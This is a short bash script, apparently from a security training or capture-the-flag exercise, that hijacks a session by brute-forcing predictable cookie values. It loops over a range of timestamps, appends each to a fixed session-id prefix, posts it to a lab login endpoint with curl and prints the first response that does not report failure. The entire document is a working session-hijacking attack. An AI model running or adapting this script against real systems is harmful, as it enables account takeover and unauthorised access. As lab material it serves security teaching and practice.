#!/bin/bash
for ts in {17749123347..17749123352}; do
  result=$(curl -s -X POST -b "hijack_session=4bd1250f-2951-42a0-be6-9477439-$ts" \
    http://web0x01.hbtn/api/a1/hijack_session/login)

  if [[ "$result" != *"failed"* ]]; then
    echo "TAPDIM: $result"
    break
  fi
done
